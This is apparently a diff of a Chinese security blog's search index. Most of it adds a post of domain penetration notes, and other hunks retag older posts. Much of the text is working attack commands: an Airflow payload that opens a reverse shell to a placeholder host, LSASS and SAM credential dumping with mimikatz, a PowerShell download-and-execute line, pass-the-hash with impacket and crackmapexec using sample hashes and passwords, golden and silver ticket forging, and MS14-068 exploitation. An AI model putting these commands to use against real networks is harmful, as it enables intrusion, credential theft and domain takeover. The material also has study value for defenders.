@@ -45,10 +45,10 @@
 <h4 id="配合InfDefaultInstall-exe"><a href="#配合InfDefaultInstall-exe" class="headerlink" title="配合InfDefaultInstall.exe"></a>配合InfDefaultInstall.exe</h4><p>运行InfDefaultInstall.exe shady.inf</p>
 <h2 id="以上"><a href="#以上" class="headerlink" title="以上"></a>以上</h2>]]></content>
       <categories>
-        <category>技巧</category>
+        <category>笔记</category>
       </categories>
       <tags>
-        <tag>Windows</tag>
+        <tag>上线</tag>
       </tags>
   </entry>
   <entry>
@@ -73,10 +73,10 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;log res.log&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
 <h2 id="以上"><a href="#以上" class="headerlink" title="以上"></a>以上</h2>]]></content>
       <categories>
-        <category>HashDump</category>
+        <category>笔记</category>
       </categories>
       <tags>
-        <tag>Windows</tag>
+        <tag>hashdump</tag>
       </tags>
   </entry>
   <entry>
@@ -108,10 +108,10 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rem c段探测</span><br><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line"></span><br><span class="line">set ip&#x3D;192.168.148</span><br><span class="line"></span><br><span class="line">for &#x2F;l %%k in (0,1,254) do  (</span><br><span class="line">@ping %ip%.%%k -w 1 -n 1| findstr &quot;TTL&#x3D;&quot; &gt;nul</span><br><span class="line">if !errorlevel! equ 0 (echo %ip%.%%k is alive ! &gt;&gt; cscan.txt ) else (echo %ip%.%%k May be not exist ! )</span><br><span class="line">)</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
 <h2 id="以上"><a href="#以上" class="headerlink" title="以上"></a>以上</h2>]]></content>
       <categories>
-        <category>信息搜集</category>
+        <category>笔记</category>
       </categories>
       <tags>
-        <tag>Windows</tag>
+        <tag>内网windwos信息搜集</tag>
       </tags>
   </entry>
   <entry>
@@ -141,10 +141,10 @@
 <h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>其他的就是各种技巧了，比如whois查备案联系人，联系人再反查域名，拿到二级域名后再去查三级域名，三级域名解析后再去C段等等无限人工递归查询。还有单位名称工商注册查询、域名备案号查询之类的，实在不行去企查查、天眼查去查查二级单位什么的。</p>
 <h1 id="以上"><a href="#以上" class="headerlink" title="以上"></a>以上</h1>]]></content>
       <categories>
-        <category>信息搜集</category>
+        <category>笔记</category>
       </categories>
       <tags>
-        <tag>Tools</tag>
+        <tag>信息搜集</tag>
       </tags>
   </entry>
   <entry>
@@ -161,10 +161,10 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;&#39;\&quot;;python -c \&quot;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;x.x.x.x&#39;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;sh&#39;,&#39;-i&#39;])\&quot;;#&quot;&#125;</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>Apache Airflow</category>
+        <category>Poc</category>
       </categories>
       <tags>
-        <tag>Poc</tag>
+        <tag>Apache Airflow</tag>
       </tags>
   </entry>
   <entry>
@@ -212,10 +212,10 @@
 <p>2021-1-15</p>
 ]]></content>
       <categories>
-        <category>Jackson</category>
+        <category>Poc</category>
       </categories>
       <tags>
-        <tag>Poc</tag>
+        <tag>Jackson</tag>
       </tags>
   </entry>
   <entry>
@@ -237,10 +237,10 @@
 <p><a href="https://zxc12609.github.io/dL/NC6.5_JDNI_RCE.jar">点我下载</a></p>
 ]]></content>
       <categories>
-        <category>用友</category>
+        <category>Poc</category>
       </categories>
       <tags>
-        <tag>Poc</tag>
+        <tag>用友</tag>
       </tags>
   </entry>
   <entry>
@@ -268,10 +268,10 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- - 1、权限是RWX权限的。</span><br><span class="line">- - 2、文件块大小在170~300内</span><br><span class="line">- - 3、代码头是以下3种字符</span><br><span class="line">           E8 DC C4 03</span><br><span class="line">           4D 5A</span><br><span class="line">           55 8B EC 8B 45</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>Windows</category>
+        <category>笔记</category>
       </categories>
       <tags>
-        <tag>应急响应</tag>
+        <tag>windows应急响应</tag>
       </tags>
   </entry>
   <entry>
@@ -310,10 +310,411 @@
 <p>以上。</p>
 ]]></content>
       <categories>
-        <category>metasploit</category>
+        <category>笔记</category>
       </categories>
       <tags>
-        <tag>笔记</tag>
+        <tag>metasploit</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>域渗透笔记</title>
+    <url>/2021/03/26/%E5%9F%9F%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<p>最近不再被这份工作烦心了，时间空了下来，所以集中精神学习了一下域渗透的知识，学完感觉自己又升了一级了。<a id="more"></a></p>
+<p>此处是用来自己做笔记的，所以只会以最精简的模式进行记录，相关原理不再赘述。</p>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="是否处于域环境"><a href="#是否处于域环境" class="headerlink" title="是否处于域环境"></a>是否处于域环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br><span class="line">net time &#x2F;domain</span><br></pre></td></tr></table></figure>
+<h2 id="有几个域"><a href="#有几个域" class="headerlink" title="有几个域"></a>有几个域</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net view &#x2F;domain</span><br></pre></td></tr></table></figure>
+<h2 id="域控是谁"><a href="#域控是谁" class="headerlink" title="域控是谁"></a>域控是谁</h2><p>域内的域控都在Domain Controller这个OU底下</p>
+<p>要查询其他的域，/domain后跟:abc.com就行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
+<p>还可以用adfind，指定根域DN就行了；或者直接dcdmp</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;OU&#x3D;Domain Controllers,DC&#x3D;exp,DC&#x3D;com&quot; -f &quot;(objectclass&#x3D;computer)&quot; -dn</span><br><span class="line"></span><br><span class="line">adfind.exe -sc dcdmp -dn</span><br></pre></td></tr></table></figure>
+<h2 id="域管是谁"><a href="#域管是谁" class="headerlink" title="域管是谁"></a>域管是谁</h2><p>注意：域控与域管是两个不同的概念，域控指的机器用户，域管指的域用户。</p>
+<p>域用户全部属于成员用户，机器用户是以机器名后面加$来命名的。普通的域用户可以在域内任意一台机器上登录（默认情况下），所以域用户不能代表那台特定的机器；机器用户是该台域内机器的管理员权限用户，所以机器用户代表了那台特定的机器。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
+<h2 id="域管组有谁"><a href="#域管组有谁" class="headerlink" title="域管组有谁"></a>域管组有谁</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net localgroup administrators &#x2F;domain</span><br></pre></td></tr></table></figure>
+<h2 id="企业管理员是谁"><a href="#企业管理员是谁" class="headerlink" title="企业管理员是谁"></a>企业管理员是谁</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;enterprise admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
+<h2 id="域有几个用户组"><a href="#域有几个用户组" class="headerlink" title="域有几个用户组"></a>域有几个用户组</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &#x2F;domain</span><br></pre></td></tr></table></figure>
+<p>还可以用adfind，adfind有很多强大的命令，这个以后再研究整理吧</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -sc oudmp -dn</span><br></pre></td></tr></table></figure>
+<h2 id="域密码策略是什么"><a href="#域密码策略是什么" class="headerlink" title="域密码策略是什么"></a>域密码策略是什么</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net accounts &#x2F;domain</span><br></pre></td></tr></table></figure>
+<h2 id="域内机器用户有谁"><a href="#域内机器用户有谁" class="headerlink" title="域内机器用户有谁"></a>域内机器用户有谁</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure>
+<p>还可用adfind，可以通过objectclass=Computer或者objectcategory=Computer查找域内的所有机器</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -f &quot;(objectcategory&#x3D;computer)&quot; -dn</span><br></pre></td></tr></table></figure>
+<h2 id="域内用户有谁"><a href="#域内用户有谁" class="headerlink" title="域内用户有谁"></a>域内用户有谁</h2><p>net user、net group这种带net的命令，全部是以smb服务的samr协议进行通信查询的。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain</span><br></pre></td></tr></table></figure>
+<p>还可以用impacket的samrdump查询</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">samrdump.py exp.com&#x2F;cs:123456@10.0.2.5 -csv</span><br></pre></td></tr></table></figure>
+<p>还可以用ldapsearch通过ldap协议查询</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -h 10.0.2.254 -D &quot;cs@exp.com&quot; -b &quot;DC&#x3D;exp,DC&#x3D;com&quot; -w &quot;Aa123123.&quot; &quot;(&amp;(objectCategory&#x3D;person)(objectClass&#x3D;user))&quot; </span><br></pre></td></tr></table></figure>
+<p>还可以用adfind查询</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b dc&#x3D;exp,dc&#x3D;com -f &quot;(&amp;(objectCategory&#x3D;person)(objectClass&#x3D;user))&quot; -dn</span><br></pre></td></tr></table></figure>
+<h2 id="域用户的登录名是什么"><a href="#域用户的登录名是什么" class="headerlink" title="域用户的登录名是什么"></a>域用户的登录名是什么</h2><p>域用户的字段有姓有名还有登录名，这几个是可以得设置不一样的，OU指定用户的组</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;CN&#x3D;cs,OU&#x3D;ceshi,DC&#x3D;exp,DC&#x3D;com&quot; displayName UserPrincipalName sAMAccountName</span><br></pre></td></tr></table></figure>
+<h2 id="域用户是否活跃"><a href="#域用户是否活跃" class="headerlink" title="域用户是否活跃"></a>域用户是否活跃</h2><p>这个是通过查找域用户相关的一些时间，例如创建时间、密码更改时间、上次登录时间来判定。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;CN&#x3D;cs,OU&#x3D;ceshi,DC&#x3D;exp,DC&#x3D;com&quot; whencreated pwdlastset lastlogon -tdcs</span><br></pre></td></tr></table></figure>
+<h2 id="密码永不过期的域用户"><a href="#密码永不过期的域用户" class="headerlink" title="密码永不过期的域用户"></a>密码永不过期的域用户</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -f &quot;useraccountcontrol:AND:&#x3D;65536&quot; -bit -dn</span><br></pre></td></tr></table></figure>
+<p>关于useraccountcontrol值的相关对应表参照文末</p>
+<h2 id="域用户能够登录的主机"><a href="#域用户能够登录的主机" class="headerlink" title="域用户能够登录的主机"></a>域用户能够登录的主机</h2><p>这个是通过指定远程DC进行查询。如果查找没有结果，说明这个用户没有限制</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -h 10.0.2.254 -sc u:cs userWorkstations</span><br></pre></td></tr></table></figure>
+<h2 id="域用户正在登陆的主机"><a href="#域用户正在登陆的主机" class="headerlink" title="域用户正在登陆的主机"></a>域用户正在登陆的主机</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psloggedon.exe \\dc</span><br><span class="line">使用Powerview的Invoke-UserHunter</span><br><span class="line">PVEFindADUser.exe -current</span><br><span class="line">netsess \\dc</span><br></pre></td></tr></table></figure>
+<p>Nmap的NSE脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smb-enum-sessions.nse获取域内主机的用户登录会话，查看当前是否有用户登录。下载地址：https:&#x2F;&#x2F;nmap.org&#x2F;nsedoc&#x2F;scripts&#x2F;smb-enum-sessions.html</span><br><span class="line">smb-enum-domains.nse对域控制器进行信息收集，可以获取主机信息用户、可使用密码策略的用户等。</span><br><span class="line">smb-enum-users.nse可以使用此脚本对域控进行扫描</span><br></pre></td></tr></table></figure>
+<h2 id="约束委派用户"><a href="#约束委派用户" class="headerlink" title="约束委派用户"></a>约束委派用户</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b dc&#x3D;exp,dc&#x3D;com -f &quot;(&amp;(samAccountType&#x3D;805306368)(msds-allowedtodelegateto&#x3D;*))&quot; -dn</span><br><span class="line"></span><br><span class="line">AdFind.exe -f &quot;useraccountcontrol:AND:&#x3D;524288&quot; -bit -dn</span><br></pre></td></tr></table></figure>
+<h2 id="约束委派主机"><a href="#约束委派主机" class="headerlink" title="约束委派主机"></a>约束委派主机</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b dc&#x3D;exp,dc&#x3D;com -f &quot;(&amp;(samAccountType&#x3D;805306368)(msds-allowedtodelegateto&#x3D;*))&quot; -dn</span><br></pre></td></tr></table></figure>
+<p>或者用PowerSploit的PowerView.ps1</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-DomainUser –TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl</span><br></pre></td></tr></table></figure>
+<h2 id="非约束委派用户"><a href="#非约束委派用户" class="headerlink" title="非约束委派用户"></a>非约束委派用户</h2><p>adfind</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b dc&#x3D;exp,dc&#x3D;com -f &quot;(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; -dn</span><br></pre></td></tr></table></figure>
+<p>ldapsearch</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap:&#x2F;&#x2F;10.0.2.254:389 -D &quot;CN&#x3D;cs,CN&#x3D;Users,DC&#x3D;exp,DC&#x3D;com&quot; -w Aa123123. -b &quot;DC&#x3D;exp,DC&#x3D;com&quot; &quot;(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="非约束委派主机"><a href="#非约束委派主机" class="headerlink" title="非约束委派主机"></a>非约束委派主机</h2><p>adfind</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b dc&#x3D;exp,dc&#x3D;com -f &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; -dn</span><br></pre></td></tr></table></figure>
+<p>ldapsearch</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -H ldap:&#x2F;&#x2F;192.168.141.145:389 -D &quot;CN&#x3D;qiyou,CN&#x3D;Users,DC&#x3D;qiyou,DC&#x3D;com&quot; -w password -b &quot;DC&#x3D;qiyou,DC&#x3D;com&quot; &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>
+<h1 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h1><h2 id="密码利用"><a href="#密码利用" class="headerlink" title="密码利用"></a>密码利用</h2><h3 id="读密码"><a href="#读密码" class="headerlink" title="读密码"></a>读密码</h3><h4 id="meterpreter方式"><a href="#meterpreter方式" class="headerlink" title="meterpreter方式"></a>meterpreter方式</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; msv	#读的是hash</span><br><span class="line">meterpreter &gt; ssp	#读的是明文</span><br><span class="line">meterpreter &gt; wdigest #读的是明文</span><br></pre></td></tr></table></figure>
+<h4 id="mimikatz方式"><a href="#mimikatz方式" class="headerlink" title="mimikatz方式"></a>mimikatz方式</h4><p>sekurlsa可用的还有msv、wdigest、kerberos、tspkg、ssp、logonPasswords、ekeys等</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log 1.txt&quot; &quot;sekurlsa::logonpasswords&quot; exit</span><br></pre></td></tr></table></figure>
+<p>还有PowerSploit的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;xx&#x2F;xx&#39;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="procdump组合mimikatz"><a href="#procdump组合mimikatz" class="headerlink" title="procdump组合mimikatz"></a>procdump组合mimikatz</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe &quot;log res.log&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
+<h4 id="注册表导出本地读取"><a href="#注册表导出本地读取" class="headerlink" title="注册表导出本地读取"></a>注册表导出本地读取</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br><span class="line">mimikatz.exe &quot;log res.log&quot; &quot;lsadump::sam &#x2F;sam:sam.hive &#x2F;system:system.hive&quot; exit</span><br></pre></td></tr></table></figure>
+<h3 id="PTH-amp-PTK"><a href="#PTH-amp-PTK" class="headerlink" title="PTH&amp;PTK"></a>PTH&amp;PTK</h3><p>PTH在kb2871997之后可能会失败。但可以使用机器用户或域用户绕过，机器用户就是域用户。</p>
+<h4 id="impacket方式"><a href="#impacket方式" class="headerlink" title="impacket方式"></a>impacket方式</h4><p>这几个脚本的使用参数都是一样的，exe和py都是一样的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmiexec.py	动静一般</span><br><span class="line">psexec.py	动静大</span><br><span class="line">dcomexec.py	动静小	</span><br><span class="line">smbexec.py	动静大</span><br><span class="line">atexec.py </span><br></pre></td></tr></table></figure>
+<p>有明文密码的情况下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 wmiexec.py administrator:Aa123123.@10.0.2.254</span><br></pre></td></tr></table></figure>
+<p>有hash的情况下</p>
+<p>工作组</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psexec.py -hashes b9466d8c3afe060325ad3b83fa6627c7:379529bb14c7cc48eb314445c3529f49 workgroup&#x2F;administrator@192.168.80.5</span><br></pre></td></tr></table></figure>
+<p>域</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 wmiexec.py exp&#x2F;administrator@10.0.2.254 -hashes :b660e61adc0aec1fe34711e6226fcc8c</span><br></pre></td></tr></table></figure>
+<p>有ase256的情况</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 wmiexec.py exp&#x2F;administrator@10.0.2.5 -aesKey a38e70861856e2f4c98134b5288383c7992e63c5031a9540e636d2cafa9e88d6</span><br></pre></td></tr></table></figure>
+<h4 id="mimikatz方式-1"><a href="#mimikatz方式-1" class="headerlink" title="mimikatz方式"></a>mimikatz方式</h4><p>ntlm可改为rc4、aes256、aes128</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth &#x2F;user:win10 &#x2F;domain:test.local &#x2F;ntlm:6a6293bc0c56d7b9731e2d5506065e4a</span><br></pre></td></tr></table></figure>
+<h4 id="批量方式"><a href="#批量方式" class="headerlink" title="批量方式"></a>批量方式</h4><p>CS、crackmap都可以批量PTH，CS直接点点点就行了</p>
+<h5 id="crackmap"><a href="#crackmap" class="headerlink" title="crackmap"></a>crackmap</h5><p>这个工具的思路作用是直接命令执行或传马</p>
+<h6 id="SMB服务探测"><a href="#SMB服务探测" class="headerlink" title="SMB服务探测"></a>SMB服务探测</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 192.168.3.0&#x2F;24</span><br></pre></td></tr></table></figure>
+<h6 id="查看密码策略"><a href="#查看密码策略" class="headerlink" title="查看密码策略"></a>查看密码策略</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --pass-pol</span><br></pre></td></tr></table></figure>
+<h6 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --sam</span><br></pre></td></tr></table></figure>
+<h6 id="枚举组"><a href="#枚举组" class="headerlink" title="枚举组"></a>枚举组</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --local-groups</span><br></pre></td></tr></table></figure>
+<h6 id="基于smbexec执行"><a href="#基于smbexec执行" class="headerlink" title="基于smbexec执行"></a>基于smbexec执行</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --exec-method smbexec -x &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
+<h6 id="基于dcom执行"><a href="#基于dcom执行" class="headerlink" title="基于dcom执行"></a>基于dcom执行</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --exec-method mmcexec -x &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
+<h6 id="基于atexec执行"><a href="#基于atexec执行" class="headerlink" title="基于atexec执行"></a>基于atexec执行</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --exec-method wmiexec -X &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
+<h6 id="利用hash传递"><a href="#利用hash传递" class="headerlink" title="利用hash传递"></a>利用hash传递</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -H &#39;579110c49145015c47ecd267657d3174&#39; --exec-method atexec -x &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
+<h6 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h6><p>默认到C盘，源-目标</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --put-file 1.bin 32.bin</span><br></pre></td></tr></table></figure>
+<h6 id="查看电脑的盘符"><a href="#查看电脑的盘符" class="headerlink" title="查看电脑的盘符"></a>查看电脑的盘符</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.0.2.5 -u administrator -p &#39;123123&#39; --disks</span><br></pre></td></tr></table></figure>
+<h5 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h5><p>Invoke-WMIexec<br>Invoke-SMBExec</p>
+<p>命令格式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">执行</span><br><span class="line">Invoke-WMIExec -Target 10.0.2.5 -Domain workgroup -Username uac -Hash 36aa83bdcab3c9fdaf321ca42a31c3fc -Command &quot;calc&quot; -verbose</span><br><span class="line">检查</span><br><span class="line">Invoke-WMIExec -Target 192.168.100.20 -Username administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0</span><br></pre></td></tr></table></figure>
+<h5 id="绕过Win32-Process-create的PTH"><a href="#绕过Win32-Process-create的PTH" class="headerlink" title="绕过Win32_Process.create的PTH"></a>绕过Win32_Process.create的PTH</h5><p>360LINTON写的vbs工具，无需445</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">主要功能：1、命令执行；2、文件上传；3、文件下载</span><br><span class="line"></span><br><span class="line">有命令回显执行方式</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs &#x2F;cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo&quot; 1</span><br><span class="line"></span><br><span class="line">无命令回显</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs &#x2F;cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo &gt; c:\1.txt&quot; 0</span><br><span class="line"></span><br><span class="line">模拟shell模式</span><br><span class="line">&gt; cscript WMIHACKER_0.6.vbs &#x2F;shell 172.16.94.187 administrator &quot;Password!&quot;</span><br><span class="line"></span><br><span class="line">文件上传-复制本机calc.exe到远程主机c:\calc.exe</span><br><span class="line">&gt; cscript wmihacker_0.4.vbe &#x2F;upload 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\windows\system32\calc.exe&quot; &quot;c:\calc&quot;</span><br><span class="line"></span><br><span class="line">文件下载-下载远程主机calc.exe到本地c:\calc.exe</span><br><span class="line">&gt; cscript wmihacker_0.4.vbe &#x2F;download 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\calc&quot; &quot;c:\windows\system32\calc.exe&quot;</span><br></pre></td></tr></table></figure>
+<h5 id="使用wmi事件订阅的PTH"><a href="#使用wmi事件订阅的PTH" class="headerlink" title="使用wmi事件订阅的PTH"></a>使用wmi事件订阅的PTH</h5><p>lengyi写的工具</p>
+<p>修改js文件中的命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Administrator\Desktop&gt; New-WMIShell -Target &#39;192.168.2.115&#39; -Username &#39;administrator&#39; -Password &#39;abc123!&#39; -ProcessName &#39;notepad.exe&#39; -JScriptPath C:\Users\Administrator\Desktop\payload.js -FilterName &#39;sdqwsda&#39; -ConsumerName &#39;sdqwsda&#39;</span><br></pre></td></tr></table></figure>
+<h3 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h3><h4 id="票据操作"><a href="#票据操作" class="headerlink" title="票据操作"></a>票据操作</h4><p>cmd方式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd:&gt;klist 查看票据</span><br><span class="line">cmd:&gt;klist purge 删除票据</span><br></pre></td></tr></table></figure>
+<p>mimikatz方式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz # kerberos::purge         &#x2F;&#x2F;清空当前机器中所有凭证</span><br><span class="line">mimikatz # kerberos::list          &#x2F;&#x2F;查看当前机器凭证</span><br><span class="line">mimikatz # kerberos::ptt 票据文件   &#x2F;&#x2F;将票据注入到内存中</span><br></pre></td></tr></table></figure>
+<h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><p>制作黄金票据的基础是获取了krbtgt账户的hash。</p>
+<p>通过各种办法导出krbtgt的hash，然后制作票据。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">制作票据，可以指定&#x2F;rc4、aes256、aes128</span><br><span class="line">kerberos::golden &#x2F;admin:administrator &#x2F;domain:exp.com &#x2F;sid:S-1-5-21-2245962460-1542597299-2684170513 &#x2F;krbtgt:92cdcc6a660c53a1be3d4080ad92efde &#x2F;ticket:admin.tck</span><br><span class="line">注入票据</span><br><span class="line">kerberos::&#x2F;ptt 1.tck</span><br></pre></td></tr></table></figure>
+<h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h4><p>白银票据使用机器账户的ntlm hash，使用cifs文件服务，仅能访问特定服务，不限于cifs文件服务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::golden &#x2F;domain:test.local &#x2F;sid:S-1-5-21-514356739-3204155868-1239341419 &#x2F;target:dc.test.local &#x2F;service:cifs &#x2F;rc4:9150e40e4ec936a15baf384ca382a3df &#x2F;user:dc$ &#x2F;ptt</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>基于PAC产生的漏洞</p>
+<h4 id="windows利用"><a href="#windows利用" class="headerlink" title="windows利用"></a>windows利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MS14-068.exe -u cs@exp.com -s S-1-5-21-2245962460-1542597299-2684170513-1103 -d 10.0.2.254 -p Aa123123.</span><br></pre></td></tr></table></figure>
+<h4 id="Linux上利用"><a href="#Linux上利用" class="headerlink" title="Linux上利用"></a>Linux上利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MS14-068.py -u cs@exp.com -s S-1-5-21-2245962460-1542597299-2684170513-1103 -d 10.0.2.254 -p Aa123123.</span><br></pre></td></tr></table></figure>
+<p>生成票据后</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME&#x3D;xx.krb</span><br><span class="line">psexec.py exp.com&#x2F;cs@dc.exp.com -k -no-pass -debug -dc-ip 10.0.2.254 -target-ip 10.0.2.254</span><br></pre></td></tr></table></figure>
